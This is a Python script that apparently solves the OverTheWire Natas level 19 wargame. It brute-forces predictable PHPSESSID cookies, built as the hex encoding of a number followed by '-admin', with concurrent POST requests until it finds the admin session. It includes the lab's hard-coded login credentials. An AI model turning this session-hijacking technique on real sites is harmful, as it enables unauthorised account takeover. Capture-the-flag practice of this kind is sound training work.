import grequests
import codecs


def exception_handler(r, e):
    print(r)
    print(e)


def brute_force(id_range):
    cookies = [{"PHPSESSID": codecs.encode((str(id)+'-admin').encode(), 'hex').decode()} for id in id_range]
    reqs = [grequests.post("http://natas19.natas.labs.overthewire.org/index.php",
                           auth=("natas19", "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs"),
                           cookies=cookie) for cookie in cookies]
    # print(reqs)
    ress = grequests.map(reqs, exception_handler=exception_handler)
    for res in ress:
        if 'regular user' not in res.text:
            print(res.text)
            return False
    return True


def main():
    for i in range(1, 641, 20):
        print("Trying {} to {}".format(i, i+20))
        keep_going = brute_force(range(i, i+20))
        if not keep_going:
            break


if __name__ == '__main__':
    main()

